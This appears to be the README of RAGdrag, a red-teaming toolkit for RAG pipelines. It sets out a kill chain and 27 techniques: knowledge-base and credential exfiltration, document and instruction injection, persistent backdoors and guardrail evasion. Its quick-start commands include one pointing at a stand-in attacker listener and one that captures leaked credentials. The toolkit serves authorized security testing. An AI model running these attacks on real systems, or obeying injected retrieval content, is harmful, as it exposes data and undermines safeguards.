<h1 align="center">RAGdrag</h1>

<p align="center">
<a href="https://www.python.org/downloads/"><img src="https://img.shields.io/badge/python-3.10+-blue.svg" alt="Python 3.10+"></a>
<a href="https://opensource.org/licenses/MIT"><img src="https://img.shields.io/badge/license-MIT-green.svg" alt="License: MIT"></a>
<a href="#"><img src="https://img.shields.io/badge/version-0.5.0-orange.svg" alt="Version"></a>
</p>

<p align="center">
RAG pipeline security assessment toolkit
</p>

---

## What is RAGdrag?

RAGdrag is a structured methodology and toolkit for testing Retrieval Augmented Generation (RAG) pipeline security. It treats the RAG pipeline as a distinct assessment surface, not just another LLM to prompt inject, but an information retrieval system with its own recon surface, data exposure paths, poisoning vectors, and evasion gaps. 27 techniques across 6 kill chain phases, mapped to [MITRE ATLAS](https://atlas.mitre.org/).

## Installation

```bash
git clone https://github.com/McKern3l/RAGdrag.git
cd ragdrag
pip install -e .
```

Requires Python 3.10+.

## Quick Start

Point ragdrag at any RAG-enabled endpoint:

```bash
# Fingerprint: is it RAG? What vector DB?
ragdrag fingerprint -t https://your-target.com/api/chat

# Probe: map chunk boundaries, retrieval thresholds, KB scope
ragdrag probe -t https://your-target.com/api/chat --depth full

# Exfiltrate: what's in the knowledge base?
ragdrag exfiltrate -t https://your-target.com/api/chat --deep

# Poison: inject documents, plant credential traps
ragdrag poison -t https://your-target.com/api/chat --listener evil.attacker.com

# Hijack: redirect retrieval, saturate context, trigger tool calls
ragdrag hijack -t https://your-target.com/api/chat --callback https://your-listener.com

# Evade: test guardrail bypass techniques
ragdrag evade -t https://your-target.com/api/chat

# Full kill chain (all 6 phases)
ragdrag scan -t https://your-target.com/api/chat

# Capture leaked credentials from URL fetcher exploitation
ragdrag listen --port 8443

# Save findings to file
ragdrag fingerprint -t https://your-target.com/api/chat -o findings.json
```

No setup beyond `pip install`. Point it at a target and go.

### Test Lab (Optional)

A vulnerable RAG test target and exercises are available in a separate repo for anyone who wants to validate the tool or follow along with the walkthrough:

**[McKern3l/RAGdrag-labs](https://github.com/McKern3l/RAGdrag-labs)** — intentionally vulnerable lab servers and test suite

The lab servers require [Ollama](https://ollama.com/) with any model pulled. Default is `llama3.2`, configurable via environment variable:

```bash
# Pull the default model
ollama pull llama3.2

# Start the open (no guardrails) lab server
cd ragdrag-labs
pip install -e .
python targets/rag_server.py

# Use a different model
OLLAMA_MODEL=mistral python targets/rag_server.py

# Then run RAGdrag against it
ragdrag scan -t http://localhost:8899/chat
```

See the [RAGdrag-labs README](https://github.com/McKern3l/RAGdrag-labs) for all configuration options.

## Commands

| Command | Description |
|---------|-------------|
| `fingerprint` | R1: Detect RAG presence and identify vector database technology |
| `probe` | R2: Map pipeline internals (chunk sizing, thresholds, KB scope) |
| `exfiltrate` | R3: Extract knowledge base contents and credentials |
| `poison` | R4: Inject attacker-controlled content into the knowledge base |
| `hijack` | R5: Take control of RAG pipeline retrieval and generation |
| `evade` | R6: Test evasion techniques against guardrails and monitoring |
| `scan` | Run multiple kill chain phases against a target |
| `listen` | Start a credential capture HTTP listener for RD-0304/RD-0403 |
| `report` | Generate JSON reports from findings |

## The RAGdrag Kill Chain

```
    R1              R2             R3              R4             R5             R6
 FINGERPRINT --> PROBE -------> EXFILTRATE --> POISON -------> HIJACK -------> EVADE

 Detect RAG     Map internals  Extract KB      Inject docs    Redirect       Bypass
 Identify DB    Chunk sizing   Harvest creds   Dominate       retrieval      guardrails
 Find model     Threshold map  Bypass filters  retrieval      Override       Avoid
 Scope target   Scope KB                       Plant traps    instructions   detection
```

Each phase builds on the previous. R1 tells you what you're testing. R2 tells you how it works internally. R3 pulls data out. R4 puts data in. R5 takes control. R6 validates evasion gaps.

Not every assessment uses all six phases. A quick exfil test might be R1 > R3 > R6. A persistence validation is R1 > R2 > R4 > R6. The kill chain is a menu, not a checklist.

## Technique Reference

| ID | Name | Phase | ATLAS Tactic |
|----|------|-------|--------------|
| RD-0101 | RAG Presence Detection | R1 Fingerprint | Reconnaissance |
| RD-0102 | Vector Database Fingerprinting | R1 Fingerprint | Reconnaissance |
| RD-0103 | Embedding Model Identification | R1 Fingerprint | Reconnaissance |
| RD-0104 | Ingestion Pipeline Mapping | R1 Fingerprint | Reconnaissance |
| RD-0105 | Document Loader Exploitation | R1 Fingerprint | Reconnaissance |
| RD-0201 | Chunk Boundary Detection | R2 Probe | Reconnaissance / ML Model Access |
| RD-0202 | Context Window Sizing | R2 Probe | Reconnaissance / ML Model Access |
| RD-0203 | Retrieval Threshold Mapping | R2 Probe | Reconnaissance / ML Model Access |
| RD-0204 | Knowledge Base Scope Enumeration | R2 Probe | Reconnaissance / ML Model Access |
| RD-0205 | RAG Jamming (Denial of Service) | R2 Probe | Reconnaissance / ML Model Access |
| RD-0301 | Direct Knowledge Extraction | R3 Exfiltrate | Exfiltration |
| RD-0302 | Guardrail-Aware Extraction | R3 Exfiltrate | Exfiltration |
| RD-0303 | Cross-Reference Exfiltration | R3 Exfiltrate | Exfiltration |
| RD-0304 | URL Fetcher Exploitation | R3 Exfiltrate | Exfiltration |
| RD-0305 | Embedding Inversion | R3 Exfiltrate | Exfiltration |
| RD-0401 | Document Injection | R4 Poison | Persistence / Impact |
| RD-0402 | Embedding Dominance | R4 Poison | Persistence / Impact |
| RD-0403 | Credential Trap | R4 Poison | Persistence / Impact |
| RD-0404 | Instruction Injection via Retrieval | R4 Poison | Persistence / Impact |
| RD-0501 | Retrieval Redirection | R5 Hijack | Execution / Impact |
| RD-0502 | Context Window Saturation | R5 Hijack | Execution / Impact |
| RD-0503 | Agent Tool Manipulation | R5 Hijack | Execution / Impact |
| RD-0504 | Persistent Backdoor via RAG | R5 Hijack | Execution / Impact |
| RD-0601 | Semantic Substitution | R6 Evade | Defense Evasion |
| RD-0602 | Retrieval Camouflage | R6 Evade | Defense Evasion |
| RD-0603 | Query Pattern Obfuscation | R6 Evade | Defense Evasion |
| RD-0604 | Multi-Turn Context Building | R6 Evade | Defense Evasion |

## Payload Templates

Pre-built query templates in `ragdrag/payloads/queries/`:

| Template | Queries | Target |
|----------|---------|--------|
| `enterprise-chatbot.json` | 14 | Corporate RAG bots (credentials, infra, PII, internal docs) |
| `customer-support.json` | 12 | Support bots (agent tools, backend APIs, customer data) |
| `knowledge-base.json` | 12 | Any document-backed RAG (inventory, sensitive content, architecture) |
| `guardrail-bypass.json` | 14 | Semantic substitution variants (word subs, encoding, reframing) |
| `fingerprint_*.json` | 3 files | R1 fingerprinting probes (RAG presence, vector DB, embedding model) |

## Links

- **RAGdrag Labs:** [github.com/McKern3l/RAGdrag-labs](https://github.com/McKern3l/RAGdrag-labs) (test target, sample results)
- **Blog:** [github.com/McKern3l](https://github.com/McKern3l)
- **MITRE ATLAS:** [atlas.mitre.org](https://atlas.mitre.org/)
- **OWASP LLM Top 10 2025:** [LLM08: Vector and Embedding Weaknesses](https://genai.owasp.org/)

## Contributing

Contributions welcome. Open an issue or PR. If you've validated RAGdrag techniques against authorized targets and have findings to share, we especially want to hear from you.

Please keep queries realistic and practically useful. Every technique in this project was validated through hands-on security testing, not theoretical analysis.

## Disclaimer

**RAGdrag is intended for authorized security testing and research only.**

All techniques were developed and validated in authorized lab environments. Use of this tool against systems without explicit authorization is illegal and unethical. The authors are not responsible for misuse.

Responsible disclosure: vulnerabilities discovered using these techniques should be reported through appropriate channels.

## License

MIT - See [LICENSE](LICENSE) for details.

## Author

**McKern3l** / [github.com/McKern3l](https://github.com/McKern3l)

---

*"The RAG pipeline is not just another LLM to prompt inject. It's an information retrieval system with its own security surface. Treat it like one."*
